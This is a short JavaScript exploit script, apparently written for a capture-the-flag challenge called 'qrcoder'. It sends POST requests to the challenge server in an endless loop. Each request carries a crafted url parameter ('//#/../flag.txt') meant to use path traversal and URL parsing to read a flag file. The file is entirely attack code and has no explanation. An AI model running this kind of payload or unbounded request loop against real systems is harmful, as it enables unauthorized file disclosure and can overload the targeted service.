const url = 'http://qrcoder.challenges.hackfest.tn:8000/qr_generator';
const a = '//#/../flag.txt';
const b = 'http://abcde';

function req(d) {
    return fetch(url, {
        method:'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `url=${d}`
    });
}

while (true) {
    req(a)
 }
